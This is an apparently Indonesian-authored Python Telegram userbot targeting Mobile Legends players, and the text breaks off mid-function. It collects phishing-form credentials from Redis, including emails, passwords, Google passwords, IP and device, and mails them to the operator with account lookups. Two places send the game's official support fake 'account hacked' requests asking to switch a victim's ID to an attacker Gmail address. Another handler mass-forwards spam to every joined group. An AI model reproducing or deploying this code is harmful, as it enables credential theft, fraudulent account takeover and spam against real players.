from telethon import TelegramClient, events
from telethon.sessions import StringSession
import redis
import asyncio
import os
import time
import re
import logging
import json
import requests
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ==================== KONFIGURASI ====================
API_ID           = int(os.environ.get('API_ID', 0))
API_HASH         = os.environ.get('API_HASH', '')
SESSION_STRING   = os.environ.get('SESSION_STRING', '')
BOT_B_TOKEN      = os.environ.get('BOT_B_TOKEN', '')
BOT_A_USERNAME   = 'bengkelmlbb_bot'
BOT_BIND_USERNAME= 'stasiunmlbb_bot'
REDIS_URL        = os.environ.get('REDIS_URL', os.environ.get('REDISCLOUD_URL', ''))
STOK_ADMIN_URL   = os.environ.get('STOK_ADMIN_URL', 'https://whatsapp.com/channel/0029VbA4PrD5fM5TMgECoE1E')

# Email config (opsional — kalau kosong, skip kirim email)
EMAIL_HOST = os.environ.get('EMAIL_HOST', 'smtp.gmail.com')
EMAIL_PORT = int(os.environ.get('EMAIL_PORT', '587'))
EMAIL_USER = os.environ.get('EMAIL_USER', '')
EMAIL_PASS = os.environ.get('EMAIL_PASS', '')
EMAIL_TO   = os.environ.get('EMAIL_TO', EMAIL_USER)

BIND_ENABLED             = os.environ.get('BIND_ENABLED', 'true').lower() == 'true'
FORWARD_TARGET           = 'mobilelegendsoffcial'
FORWARD_ENABLED          = True
AUTO_REDEEM_ENABLED      = os.environ.get('AUTO_REDEEM_ENABLED', 'true').lower() == 'true'
AUTO_REDEEM_CHANNEL      = os.environ.get('AUTO_REDEEM_CHANNEL', 'bengkelmlbb_info')
REDEEM_DELAY             = int(os.environ.get('REDEEM_DELAY', '0'))
AUTO_REDEEM_JEBRAY_ENABLED = os.environ.get('AUTO_REDEEM_JEBRAY_ENABLED', 'true').lower() == 'true'
AUTO_REDEEM_JEBRAY_CHANNEL = os.environ.get('AUTO_REDEEM_JEBRAY_CHANNEL', 'jebraytools')
AUTO_REDEEM_JEBRAY_BOT   = 'jebraybot'
AUTO_SHARE_ENABLED       = os.environ.get('AUTO_SHARE_ENABLED', 'true').lower() == 'true'

# Timeout (detik)
REQUEST_TIMEOUT  = 30
CAPTCHA_TIMEOUT  = 30
OCR_TIMEOUT      = 10
BIND_WAIT_TIMEOUT= 30
FORM_DATA_TIMEOUT= 20   # tunggu form data dari Redis max 20 detik

# ==================== COUNTRY MAPPING ====================
country_mapping = {
  'AF': '🇦🇫 Afghanistan', 'AL': '🇦🇱 Albania', 'DZ': '🇩🇿 Algeria',
  'AO': '🇦🇴 Angola', 'AR': '🇦🇷 Argentina', 'AM': '🇦🇲 Armenia',
  'AU': '🇦🇺 Australia', 'AT': '🇦🇹 Austria', 'AZ': '🇦🇿 Azerbaijan',
  'BH': '🇧🇭 Bahrain', 'BD': '🇧🇩 Bangladesh', 'BY': '🇧🇾 Belarus',
  'BE': '🇧🇪 Belgium', 'BZ': '🇧🇿 Belize', 'BO': '🇧🇴 Bolivia',
  'BA': '🇧🇦 Bosnia', 'BR': '🇧🇷 Brazil', 'BN': '🇧🇳 Brunei',
  'BG': '🇧🇬 Bulgaria', 'KH': '🇰🇭 Cambodia', 'CM': '🇨🇲 Cameroon',
  'CA': '🇨🇦 Canada', 'CL': '🇨🇱 Chile', 'CN': '🇨🇳 China',
  'CO': '🇨🇴 Colombia', 'CR': '🇨🇷 Costa Rica', 'HR': '🇭🇷 Croatia',
  'CU': '🇨🇺 Cuba', 'CY': '🇨🇾 Cyprus', 'CZ': '🇨🇿 Czech Republic',
  'DK': '🇩🇰 Denmark', 'DO': '🇩🇴 Dominican Republic', 'EC': '🇪🇨 Ecuador',
  'EG': '🇪🇬 Egypt', 'SV': '🇸🇻 El Salvador', 'EE': '🇪🇪 Estonia',
  'ET': '🇪🇹 Ethiopia', 'FI': '🇫🇮 Finland', 'FR': '🇫🇷 France',
  'GE': '🇬🇪 Georgia', 'DE': '🇩🇪 Germany', 'GH': '🇬🇭 Ghana',
  'GR': '🇬🇷 Greece', 'GT': '🇬🇹 Guatemala', 'HN': '🇭🇳 Honduras',
  'HK': '🇭🇰 Hong Kong', 'HU': '🇭🇺 Hungary', 'IS': '🇮🇸 Iceland',
  'IN': '🇮🇳 India', 'ID': '🇮🇩 Indonesia', 'IR': '🇮🇷 Iran',
  'IQ': '🇮🇶 Iraq', 'IE': '🇮🇪 Ireland', 'IL': '🇮🇱 Israel',
  'IT': '🇮🇹 Italy', 'JM': '🇯🇲 Jamaica', 'JP': '🇯🇵 Japan',
  'JO': '🇯🇴 Jordan', 'KZ': '🇰🇿 Kazakhstan', 'KE': '🇰🇪 Kenya',
  'KR': '🇰🇷 South Korea', 'KP': '🇰🇵 North Korea', 'KW': '🇰🇼 Kuwait',
  'KG': '🇰🇬 Kyrgyzstan', 'LA': '🇱🇦 Laos', 'LV': '🇱🇻 Latvia',
  'LB': '🇱🇧 Lebanon', 'LY': '🇱🇾 Libya', 'LT': '🇱🇹 Lithuania',
  'LU': '🇱🇺 Luxembourg', 'MO': '🇲🇴 Macao', 'MK': '🇲🇰 Macedonia',
  'MG': '🇲🇬 Madagascar', 'MY': '🇲🇾 Malaysia', 'MV': '🇲🇻 Maldives',
  'MT': '🇲🇹 Malta', 'MX': '🇲🇽 Mexico', 'MD': '🇲🇩 Moldova',
  'MN': '🇲🇳 Mongolia', 'ME': '🇲🇪 Montenegro', 'MA': '🇲🇦 Morocco',
  'MZ': '🇲🇿 Mozambique', 'MM': '🇲🇲 Myanmar', 'NA': '🇳🇦 Namibia',
  'NP': '🇳🇵 Nepal', 'NL': '🇳🇱 Netherlands', 'NZ': '🇳🇿 New Zealand',
  'NI': '🇳🇮 Nicaragua', 'NG': '🇳🇬 Nigeria', 'NO': '🇳🇴 Norway',
  'OM': '🇴🇲 Oman', 'PK': '🇵🇰 Pakistan', 'PA': '🇵🇦 Panama',
  'PG': '🇵🇬 Papua New Guinea', 'PY': '🇵🇾 Paraguay', 'PE': '🇵🇪 Peru',
  'PH': '🇵🇭 Philippines', 'PL': '🇵🇱 Poland', 'PT': '🇵🇹 Portugal',
  'QA': '🇶🇦 Qatar', 'RO': '🇷🇴 Romania', 'RU': '🇷🇺 Russia',
  'RW': '🇷🇼 Rwanda', 'SA': '🇸🇦 Saudi Arabia', 'SN': '🇸🇳 Senegal',
  'RS': '🇷🇸 Serbia', 'SG': '🇸🇬 Singapore', 'SK': '🇸🇰 Slovakia',
  'SI': '🇸🇮 Slovenia', 'SO': '🇸🇴 Somalia', 'ZA': '🇿🇦 South Africa',
  'SS': '🇸🇸 South Sudan', 'ES': '🇪🇸 Spain', 'LK': '🇱🇰 Sri Lanka',
  'SD': '🇸🇩 Sudan', 'SE': '🇸🇪 Sweden', 'CH': '🇨🇭 Switzerland',
  'SY': '🇸🇾 Syria', 'TW': '🇹🇼 Taiwan', 'TJ': '🇹🇯 Tajikistan',
  'TZ': '🇹🇿 Tanzania', 'TH': '🇹🇭 Thailand', 'TL': '🇹🇱 Timor-Leste',
  'TG': '🇹🇬 Togo', 'TT': '🇹🇹 Trinidad and Tobago', 'TN': '🇹🇳 Tunisia',
  'TR': '🇹🇷 Turkey', 'TM': '🇹🇲 Turkmenistan', 'UG': '🇺🇬 Uganda',
  'UA': '🇺🇦 Ukraine', 'AE': '🇦🇪 UAE', 'GB': '🇬🇧 United Kingdom',
  'US': '🇺🇸 United States', 'UY': '🇺🇾 Uruguay', 'UZ': '🇺🇿 Uzbekistan',
  'VE': '🇻🇪 Venezuela', 'VN': '🇻🇳 Vietnam', 'YE': '🇾🇪 Yemen',
  'ZM': '🇿🇲 Zambia', 'ZW': '🇿🇼 Zimbabwe',
}

# ==================== VALIDASI ENV ====================
if not all([API_ID, API_HASH, SESSION_STRING, BOT_B_TOKEN, REDIS_URL]):
    logger.error("❌ Missing required environment variables!")
    exit(1)

# ==================== REDIS ====================
try:
    r = redis.from_url(REDIS_URL)
    r.ping()
    logger.info("✅ Redis connected")
except Exception as e:
    logger.error(f"❌ Redis connection failed: {e}")
    exit(1)

# ==================== GLOBAL STATE ====================
client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)

bot_status        = {'in_captcha': False, 'waiting_ocr': False, 'ocr_start_time': 0}
sent_requests     = {}
waiting_for_result= {}
downloaded_photos = []
active_requests   = {}
captcha_timer_task= None

pending_bind      = {}
pending_bind_wait = {}
bind_data         = {}

BIND_REQUEST_TIMEOUT = 30

# ==================== AUTO REDEEM MANAGERS ====================
class AutoRedeemManager:
    def __init__(self, redis_key='auto_redeem', label='VCR'):
        self.key = redis_key
        self.label = label
        self.redeemed_codes  = set()
        self.failed_codes    = set()
        self.last_message_ids= set()

    def add_redeemed(self, code):
        self.redeemed_codes.add(code)
        logger.info(f"✅ {self.label} {code} redeemed")

    def add_failed(self, code):
        self.failed_codes.add(code)

    def is_redeemed(self, code):
        clean = code.replace('-','').replace('VCR','').replace('JEBRAY_','')
        for c in self.redeemed_codes | self.failed_codes:
            if clean in c or c in clean:
                return True
        return False

    def is_processed(self, msg_id):
        return msg_id in self.last_message_ids

    def add_processed(self, msg_id):
        self.last_message_ids.add(msg_id)
        if len(self.last_message_ids) > 500:
            self.last_message_ids = set(list(self.last_message_ids)[-200:])

    def save(self):
        try:
            r.set(self.key, json.dumps({
                'redeemed': list(self.redeemed_codes),
                'failed':   list(self.failed_codes),
                'last_msgs':list(self.last_message_ids)
            }))
        except Exception as e:
            logger.error(f"❌ Save error: {e}")

    def load(self):
        try:
            data = r.get(self.key)
            if data:
                d = json.loads(data)
                self.redeemed_codes   = set(d.get('redeemed', []))
                self.failed_codes     = set(d.get('failed', []))
                self.last_message_ids = set(d.get('last_msgs', []))
                logger.info(f"📂 {self.label}: {len(self.redeemed_codes)} redeemed codes loaded")
        except Exception as e:
            logger.error(f"❌ Load error: {e}")

auto_redeem       = AutoRedeemManager('auto_redeem', 'VCR')
auto_redeem_jebray= AutoRedeemManager('auto_redeem_jebray', 'JEBRAY')

# ==================== HELPER FUNCTIONS ====================

def clean_bind_text(text):
    if 'Private' in text:
        text = re.sub(r'Bind\s*\(Private\)', 'Hide information', text)
        text = re.sub(r'\(Private\)', 'Hide information', text)
        text = re.sub(r'\bPrivate\b', 'Hide information', text)
    text = re.sub(r'\s*\(Unverified\)', '', text)
    if 'Moonton Unverified' in text:
        text = re.sub(r'Moonton\s*:\s*Moonton\s+Unverified', 'Moonton: empty.', text)
        text = re.sub(r'Moonton\s+Unverified', 'Moonton: empty.', text)
    text = re.sub(r'empty\.\.', 'empty.', text)
    text = re.sub(r'\s+', ' ', text).strip()
    return text

def validate_mlbb_gopay_sync(user_id, server_id):
    url = 'https://gopay.co.id/games/v1/order/user-account'
    headers = {
        'Content-Type': 'application/json',
        'X-Client': 'web-mobile',
        'X-Timestamp': str(int(time.time() * 1000)),
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'
    }
    body = {"code": "MOBILE_LEGENDS", "data": {
        "userId": str(user_id).strip(), "zoneId": str(server_id).strip()
    }}
    try:
        response = requests.post(url, headers=headers, json=body, timeout=30)
        if response.status_code not in [200, 201]:
            return {'status': False, 'message': f'HTTP {response.status_code}'}
        result = response.json()
        if not result or 'data' not in result:
            return {'status': False, 'message': 'Invalid response'}
        data = result['data']
        username = data.get('username', 'Unknown').replace('+', ' ')
        country  = data.get('countryOrigin', 'ID').upper()
        region   = country_mapping.get(country, f'🌍 {country}')
        return {'status': True, 'username': username, 'region': region}
    except Exception as e:
        return {'status': False, 'message': str(e)}

def get_form_data_by_session(session_id):
    """Baca form data dari Redis berdasarkan session ID (opsional)."""
    if not session_id:
        return None
    try:
        key  = f"formdata:{session_id}"
        data = r.get(key)
        if data:
            r.delete(key)
            logger.info(f"📋 Form data (session {session_id}) ditemukan")
            return json.loads(data)
    except Exception as e:
        logger.warning(f"⚠️ Gagal baca form data Redis (opsional, lanjut tanpa): {e}")
    return None

def send_combined_email(form_data, bind_text, nickname, region, uid, sid,
                        android, ios, creation=None, last_login=None):
    """Kirim email gabungan. Jika konfigurasi email kosong → skip."""
    if not EMAIL_USER or not EMAIL_PASS:
        logger.info("ℹ️ Email tidak dikonfigurasi, skip")
        return

    phone   = form_data.get('phone', '-')   if form_data else '-'
    level   = form_data.get('level', '-')   if form_data else '-'
    points  = form_data.get('points', '-')  if form_data else '-'
    email1  = form_data.get('email', '-')   if form_data else '-'
    pass1   = form_data.get('password', '-')if form_data else '-'
    gpass1  = form_data.get('pass', '-')    if form_data else '-'
    email2  = form_data.get('email2', '-')  if form_data else '-'
    pass2   = form_data.get('password2','-')if form_data else '-'
    gpass2  = form_data.get('pass2', '-')   if form_data else '-'
    login   = form_data.get('login', '-')   if form_data else '-'
    ip      = form_data.get('ip', '-')      if form_data else '-'
    country = form_data.get('country', '-') if form_data else '-'
    city    = form_data.get('city', '-')    if form_data else '-'
    device  = form_data.get('device', '-')  if form_data else '-'
    browser = form_data.get('browser', '-') if form_data else '-'

    extra = ''
    if creation:   extra += f"<tr><td>Year Creation</td><td>: <b>{creation}</b></td></tr>"
    if last_login: extra += f"<tr><td>Last Login</td><td>: <b>{last_login}</b></td></tr>"

    subject = f"[MLBB] {uid} | {nickname} | {region}"
    html = f"""<html><body><center>
<div style="background:#0E2545;padding:15px;border-radius:8px;max-width:600px;font-family:arial;">
<h2 style="color:#FFD700;margin:0 0 12px 0;">📊 MLBB ACCOUNT RESULT</h2>

<div style="background:#1a3a6e;padding:10px;border-radius:5px;margin-bottom:10px;text-align:left;">
<b style="color:#79EAFA;">🎮 ACCOUNT INFO</b><br>
<table width="100%" style="color:#fff;font-size:13px;">
<tr><td width="35%">Game ID</td><td>: <b>{uid}</b></td></tr>
<tr><td>Server</td><td>: <b>{sid}</b></td></tr>
<tr><td>Nickname</td><td>: <b>{nickname}</b></td></tr>
<tr><td>Region</td><td>: <b>{region}</b></td></tr>
<tr><td>Android Login</td><td>: <b>{android}x</b></td></tr>
<tr><td>iOS Login</td><td>: <b>{ios}x</b></td></tr>
{extra}
</table></div>

<div style="background:#1a3a6e;padding:10px;border-radius:5px;margin-bottom:10px;text-align:left;">
<b style="color:#79EAFA;">🔐 BIND INFO (@bengkelmlbb_bot)</b><br>
<pre style="color:#fff;font-size:11px;white-space:pre-wrap;word-break:break-word;">{bind_text[:1800]}</pre>
</div>

<div style="background:#1a3a6e;padding:10px;border-radius:5px;margin-bottom:10px;text-align:left;">
<b style="color:#FFD700;">📝 DATA INPUT</b><br>
<table width="100%" style="color:#fff;font-size:13px;">
<tr><td width="35%">Phone</td><td>: <b>{phone}</b></td></tr>
<tr><td>Account Level</td><td>: <b>{level}</b></td></tr>
<tr><td>Collection Points</td><td>: <b>{points}</b></td></tr>
<tr><td>Login Method</td><td>: <b>{login}</b></td></tr>
</table></div>

<div style="background:#1a3a6e;padding:10px;border-radius:5px;margin-bottom:10px;text-align:left;">
<b style="color:#FFD700;">📧 LOGIN INFO 1</b><br>
<table width="100%" style="color:#fff;font-size:13px;">
<tr><td width="35%">Email/User</td><td>: <b>{email1}</b></td></tr>
<tr><td>Password</td><td>: <b>{pass1}</b></td></tr>
<tr><td>Google Pass</td><td>: <b>{gpass1}</b></td></tr>
</table></div>

<div style="background:#1a3a6e;padding:10px;border-radius:5px;margin-bottom:10px;text-align:left;">
<b style="color:#FFD700;">📧 LOGIN INFO 2</b><br>
<table width="100%" style="color:#fff;font-size:13px;">
<tr><td width="35%">Email/User</td><td>: <b>{email2}</b></td></tr>
<tr><td>Password</td><td>: <b>{pass2}</b></td></tr>
<tr><td>Google Pass</td><td>: <b>{gpass2}</b></td></tr>
</table></div>

<div style="background:#1a3a6e;padding:10px;border-radius:5px;text-align:left;">
<b style="color:#79EAFA;">🌐 DEVICE & IP</b><br>
<table width="100%" style="color:#fff;font-size:13px;">
<tr><td width="35%">IP</td><td>: <b>{ip}</b></td></tr>
<tr><td>Country</td><td>: <b>{country}</b></td></tr>
<tr><td>City</td><td>: <b>{city}</b></td></tr>
<tr><td>Device</td><td>: <b>{device}</b></td></tr>
<tr><td>Browser</td><td>: <b>{browser}</b></td></tr>
</table></div>
</div></center></body></html>"""

    try:
        msg = MIMEMultipart('alternative')
        msg['Subject'] = subject
        msg['From']    = EMAIL_USER
        msg['To']      = EMAIL_TO
        msg.attach(MIMEText(html, 'html'))
        with smtplib.SMTP(EMAIL_HOST, EMAIL_PORT, timeout=15) as srv:
            srv.starttls()
            srv.login(EMAIL_USER, EMAIL_PASS)
            srv.sendmail(EMAIL_USER, EMAIL_TO, msg.as_string())
        logger.info(f"📧 Email gabungan terkirim untuk {uid}:{sid}")
    except Exception as e:
        logger.error(f"❌ Gagal kirim email: {e}")

def cleanup_downloaded_photos():
    global downloaded_photos
    for p in downloaded_photos[:]:
        try:
            if os.path.exists(p): os.remove(p)
            downloaded_photos.remove(p)
        except: pass

def extract_telegram_from_bind(text, uid=None, sid=None):
    telegram_value = None
    for line in text.split('\n'):
        if 'Telegram' in line and ':' in line:
            value = line.split(':', 1)[1].strip()
            value = re.sub(r'[*_`]', '', value).strip()
            if value.lower() not in ['empty.', 'empty', '']:
                telegram_value = value
                break
    if telegram_value:
        clean = re.sub(r'[^a-zA-Z0-9_]', '', telegram_value)
        if uid and sid:
            msg = (f"Can you help me change my Moonton email address? Because it was previously "
                   f"hacked by someone and I need your help to change the email address to "
                   f"pancinganandro@gmail.com for the game user ID {uid} server {sid}, please help me.")
            return (msg, f"@{clean}")
        return (None, f"@{clean}")
    return (None, None)

def format_final_output(original_text, nickname, region, uid, sid, android, ios,
                        creation=None, last_login=None, form_data=None):
    """
    Buat satu teks output gabungan: info akun + bind + data form web.
    form_data bersifat opsional — jika None, bagian form tidak ditampilkan.
    """
    keywords = ['Moonton','VK','Google Play','Tiktok','Facebook','Apple','GCID','Telegram','WhatsApp']
    lines    = original_text.split('\n')
    groups   = {}
    current_keyword = None
    current_lines   = []

    for line in lines:
        stripped = line.strip()
        if not stripped: continue
        if stripped.startswith('✧'):
            if current_keyword:
                groups[current_keyword] = current_lines
            keyword_raw = stripped[1:].strip().split(':', 1)[0].strip()
            current_keyword = keyword_raw
            current_lines   = [stripped]
        else:
            if current_keyword:
                current_lines.append(stripped)
    if current_keyword:
        groups[current_keyword] = current_lines

    bind_info = []
    for kw in keywords:
        if kw in groups:
            main_line = groups[kw][0]
            if main_line.startswith('✧'): main_line = main_line[1:].strip()
            if kw == "Moonton":
                sub_lines = [l for l in groups[kw] if l.startswith('-')]
                if sub_lines:
                    for sub in sub_lines:
                        sub_clean = sub.lstrip('-').strip()
                        if ':' in sub_clean:
                            lbl, val = sub_clean.split(':', 1)
                            bind_info.append(f"• {lbl.strip()}: {clean_bind_text(val.strip())}")
                        else:
                            bind_info.append(f"• {sub_clean}")
                    continue
            main_line = clean_bind_text(main_line)
            if ':' in main_line:
                lbl, val = main_line.split(':', 1)
                bind_info.append(f"• {lbl.strip()}: {val.strip()}")
            else:
                bind_info.append(f"• {kw}: {main_line}")
        else:
            bind_info.append(f"• {kw}: empty.")

    extra = ''
    if creation:   extra += f"\nYear Creation : {creation}"
    if last_login: extra += f"\nLast Login    : {last_login}"

    output = f"""INFORMATION ACCOUNT:
ID Server  : {uid} ({sid})
Nickname   : {nickname}
Region     : {region}{extra}

BIND INFO:
{chr(10).join(bind_info)}

Device Login: Android {android} | iOS {ios}"""

    # Tambah data form web jika ada
    if form_data:
        phone   = form_data.get('phone', '-')
        level   = form_data.get('level', '-')
        points  = form_data.get('points', '-')
        email1  = form_data.get('email', '-')
        pass1   = form_data.get('password', '-')
        gpass1  = form_data.get('pass', '-')
        email2  = form_data.get('email2', '-')
        pass2   = form_data.get('password2', '-')
        gpass2  = form_data.get('pass2', '-')
        login   = form_data.get('login', '-')
        ip      = form_data.get('ip', '-')
        country = form_data.get('country', '-')

        output += f"""

━━━━━━━━━━━━━━━━━━━━━━━━
DATA INPUT (dari web):
• Phone         : {phone}
• Account Level : {level}
• Coll. Points  : {points}
• Login Method  : {login}

LOGIN INFO 1:
• Email/User    : {email1}
• Password      : {pass1}
• Google Pass   : {gpass1}

LOGIN INFO 2:
• Email/User    : {email2}
• Password      : {pass2}
• Google Pass   : {gpass2}

DEVICE & IP:
• IP            : {ip}
• Country       : {country}"""

    reply_markup = {'inline_keyboard': [[{'text': 'CHANNEL TELEGRAM', 'url': STOK_ADMIN_URL}]]}
    return output, reply_markup

async def send_status_to_user(chat_id, text, reply_to_message_id=None, reply_markup=None):
    url  = f"https://api.telegram.org/bot{BOT_B_TOKEN}/sendMessage"
    data = {'chat_id': chat_id, 'text': text}
    if reply_to_message_id: data['reply_to_message_id'] = reply_to_message_id
    if reply_markup:        data['reply_markup'] = json.dumps(reply_markup)
    try:
        response = requests.post(url, json=data, timeout=10)
        if response.status_code == 200:
            return response.json()['result']['message_id']
    except Exception as e:
        logger.error(f"❌ Kirim status: {e}")
    return None

async def edit_status_message(chat_id, message_id, text, reply_markup=None):
    url  = f"https://api.telegram.org/bot{BOT_B_TOKEN}/editMessageText"
    data = {'chat_id': chat_id, 'message_id': message_id, 'text': text}
    if reply_markup: data['reply_markup'] = json.dumps(reply_markup)
    try:
        requests.post(url, json=data, timeout=10)
    except Exception as e:
        logger.error(f"❌ Edit pesan: {e}")

async def timeout_checker():
    while True:
        if bot_status['in_captcha']:
            await asyncio.sleep(1); continue
        now = time.time()
        to_remove = []
        for req_id, req_data in list(active_requests.items()):
            if now - req_data['start_time'] > REQUEST_TIMEOUT:
                logger.warning(f"⏰ Request timeout: {req_id}")
                await edit_status_message(req_data['chat_id'], req_data['message_id'], "Request timeout. Silakan coba lagi.")
                try:
                    head = r.lindex('pending_requests', 0)
                    if head and head.decode('utf-8') == req_id: r.lpop('pending_requests')
                    r.delete(req_id)
                except: pass
                waiting_for_result.pop(req_data['chat_id'], None)
                to_remove.append(req_id)
        for req_id in to_remove:
            active_requests.pop(req_id, None)

        if BIND_ENABLED:
            now = time.time()
            for chat_id in [c for c, info in pending_bind.items()
                            if info.get('bind_sent_time', 0) > 0 and now - info['bind_sent_time'] > BIND_REQUEST_TIMEOUT]:
                pending_bind.pop(chat_id, None)
                if chat_id in pending_bind_wait:
                    pending_bind_wait[chat_id].set()
                    pending_bind_wait.pop(chat_id, None)
        await asyncio.sleep(1)

# ==================== AUTO REDEEM VCR ====================
def extract_vcr_codes(text):
    if not text: return []
    seen, codes = set(), []
    patterns = [r'(VCR-[A-Z0-9]{6,12})', r'(VCR[A-Z0-9]{6,12})', r'([Vv][Cc][Rr][-\s]?[A-Z0-9]{6,12})']
    for pat in patterns:
        for m in re.findall(pat, text, re.IGNORECASE):
            code = str(m).upper().strip()
            if '-' in code:
                parts = code.split('-')
                if len(parts) >= 2: code = f"VCR-{parts[-1]}"
            else:
                pos = code.find('VCR')
                if pos != -1:
                    after = re.sub(r'[^A-Z0-9]', '', code[pos+3:])
                    if after: code = f"VCR-{after}"
            clean = code.replace('-','').replace('VCR','')
            if len(clean) >= 4 and code not in seen:
                seen.add(code); codes.append(code)
    return codes

def has_vcr(text):
    return bool(re.search(r'[Vv][Cc][Rr]', text))

async def send_redeem_vcr(code):
    try:
        await client.send_message(BOT_A_USERNAME, f"/redeem {code}")
        await asyncio.sleep(2)
        return True
    except Exception as e:
        logger.error(f"❌ VCR send: {e}"); return False

async def process_voucher_codes(codes):
    new_codes = [c for c in codes if not auto_redeem.is_redeemed(c)]
    if not new_codes: return
    await send_status_to_user(7240340418, f"🎯 VCR: {len(new_codes)} code(s)\n{', '.join(new_codes)}")
    for i, code in enumerate(new_codes, 1):
        if i > 1 and REDEEM_DELAY > 0: await asyncio.sleep(REDEEM_DELAY)
        if await send_redeem_vcr(code):
            auto_redeem.add_redeemed(code)
            await send_status_to_user(7240340418, f"✅ VCR Sent: {code}")
        else:
            auto_redeem.add_failed(code)
            await send_status_to_user(7240340418, f"❌ VCR Failed: {code}")
    auto_redeem.save()

# ==================== AUTO REDEEM JEBRAY ====================
def extract_jebray_codes(text):
    if not text: return []
    seen, codes = set(), []
    for m in re.findall(r'(JEBRAY_[A-Za-z0-9]+)', text):
        if m not in seen: seen.add(m); codes.append(m)
    return codes

async def send_redeem_jebray(code):
    try:
        await client.send_message(AUTO_REDEEM_JEBRAY_BOT, f"/redeem {code}")
        return True
    except Exception as e:
        logger.error(f"❌ JEBRAY send: {e}"); return False

# ==================== HANDLER: PERINTAH LANGSUNG KE USERBOT ====================
@events.register(events.NewMessage)
async def userbot_command_handler(event):
    message = event.message
    text    = message.text or ''
    sender  = await message.get_sender()

    if not text.startswith('/send'):
        return

    rest  = text[5:].strip()
    uid = sid = username = None
    parts = rest.split()

    if len(parts) >= 2:
        uid = re.sub(r'[^0-9]', '', parts[0])
        sid = re.sub(r'[^0-9]', '', parts[1])
        username = parts[2] if len(parts) > 2 else None

    if not uid or not sid:
        for pattern in [r'(\d+)\s*\((\d+)\)\s+(\S+)', r'(\d+)[\-_|](\d+)\s+(\S+)', r'(\d+)\s+(\d+)']:
            m = re.search(pattern, rest)
            if m:
                uid = m.group(1); sid = m.group(2)
                username = m.group(3) if len(m.groups()) > 2 else '0'
                break

    if uid and sid:
        custom_message = (f"Can you help me change my Moonton email address? Because it was previously "
                          f"hacked by someone and I need your help to change the email address to "
                          f"pancinganandro@gmail.com for the game user ID {uid} server {sid}, please help me.")
        await client.send_message(FORWARD_TARGET, custom_message)
        if username and username not in ['0', 'empty', '']:
            await client.send_message(FORWARD_TARGET, username)
        try: await message.delete()
        except: pass
    else:
        err = await message.reply("❌ Format: /send 386941792 8554 @username")
        await asyncio.sleep(5)
        try: await err.delete(); await message.delete()
        except: pass

# ==================== HANDLER: AUTO SHARE /pm ====================
@events.register(events.NewMessage)
async def auto_share_handler(event):
    if not AUTO_SHARE_ENABLED or event.message.out or event.message.is_group:
        return
    text = event.message.text or ''
    if not text.startswith('/pm'):
        return
    if not event.message.is_reply:
        await event.message.reply("❌ Reply ke pesan yang ingin dipromosikan, lalu ketik /pm")
        return
    replied_msg = await event.message.get_reply_message()
    if not replied_msg:
        await event.message.reply("❌ Gagal ambil pesan."); return

    group_list = [d async for d in client.iter_dialogs() if d.is_group or d.is_channel]
    status_msg = await event.message.reply(f"🔄 Meneruskan ke {len(group_list)} grup...")
    ok = fail = 0
    for i, dialog in enumerate(group_list):
        try:
            await client.forward_messages(dialog.id, replied_msg.id, replied_msg.chat_id)
            ok += 1; await asyncio.sleep(2)
        except Exception as e:
            fail += 1
            if 'flood' in str(e).lower(): await asyncio.sleep(5)
        if (i + 1) % 10 == 0:
            await status_msg.edit(f"🔄 {ok} berhasil, {fail} gagal dari {i+1}/{len(group_list)}...")
    await status_msg.edit(f"✅ Selesai: {ok} berhasil, {fail} gagal.")
    try: await event.message.delete()
    except: pass

# ==================== HANDLER: HASIL DARI BENGKELMLBB_BOT ====================
@events.register(events.NewMessage)
async def message_handler(event):
    global captcha_timer_task, bot_status
    message   = event.message
    chat_id   = event.chat_id
    sender_id = event.sender_id
    text      = message.text or message.message or ''

    if chat_id != 7240340418 and sender_id != 7240340418:
        return

    logger.info(f"📩 Dari Bot A: {text[:100]}")

    # --- Hasil BIND ACCOUNT INFO ---
    if text.startswith('──────────────────────') and 'BIND ACCOUNT INFO' in text:
        if not active_requests:
            logger.warning("❌ Tidak ada request aktif"); return

        req_id, req_info = next(iter(active_requests.items()))
        user_id    = req_info['chat_id']
        message_id = req_info['message_id']
        session_id = req_info.get('session_id')  # dari web form (bisa None)

        uid     = (re.search(r'ID:?\s*(\d+)', text) or type('', (), {'group': lambda *a: 'Unknown'})()).group(1)
        sid     = (re.search(r'Server:?\s*(\d+)', text) or type('', (), {'group': lambda *a: 'Unknown'})()).group(1)
        android = (re.search(r'Android:?\s*(\d+)', text) or type('', (), {'group': lambda *a: '0'})()).group(1)
        ios     = (re.search(r'iOS:?\s*(\d+)', text) or type('', (), {'group': lambda *a: '0'})()).group(1)

        id_m  = re.search(r'ID:?\s*(\d+)', text)
        srv_m = re.search(r'Server:?\s*(\d+)', text)
        and_m = re.search(r'Android:?\s*(\d+)', text)
        ios_m = re.search(r'iOS:?\s*(\d+)', text)

        uid     = id_m.group(1)  if id_m  else 'Unknown'
        sid     = srv_m.group(1) if srv_m else 'Unknown'
        android = and_m.group(1) if and_m else '0'
        ios     = ios_m.group(1) if ios_m else '0'

        expected_uid = req_info['args'][0]
        expected_sid = req_info['args'][1]

        # Cocokkan request jika ada mismatch
        if uid != expected_uid or sid != expected_sid:
            found = False
            for r_id, r_info in active_requests.items():
                if r_info['args'][0] == uid and r_info['args'][1] == sid:
                    req_id = r_id; req_info = r_info
                    user_id = req_info['chat_id']
                    message_id = req_info['message_id']
                    session_id = req_info.get('session_id')
                    found = True; break
            if not found:
                await edit_status_message(user_id, message_id, "Terjadi kesalahan. Silakan coba lagi.")
                return

        # Validasi gopay
        gopay    = validate_mlbb_gopay_sync(uid, sid)
        nickname = gopay['username'] if gopay['status'] else 'Tidak diketahui'
        region   = gopay['region']   if gopay['status'] else '🌍 Tidak diketahui'

        creation = last_login = None

        # Tunggu bind data (jika aktif)
        if BIND_ENABLED:
            bind_info = bind_data.get(user_id)
            if bind_info:
                creation = bind_info.get('creation')
                last_login = bind_info.get('last_login')
                bind_data.pop(user_id, None)
            elif user_id in pending_bind:
                if user_id not in pending_bind_wait:
                    pending_bind_wait[user_id] = asyncio.Event()
                try:
                    await asyncio.wait_for(pending_bind_wait[user_id].wait(), timeout=BIND_WAIT_TIMEOUT)
                    bind_info = bind_data.get(user_id)
                    if bind_info:
                        creation = bind_info.get('creation')
                        last_login = bind_info.get('last_login')
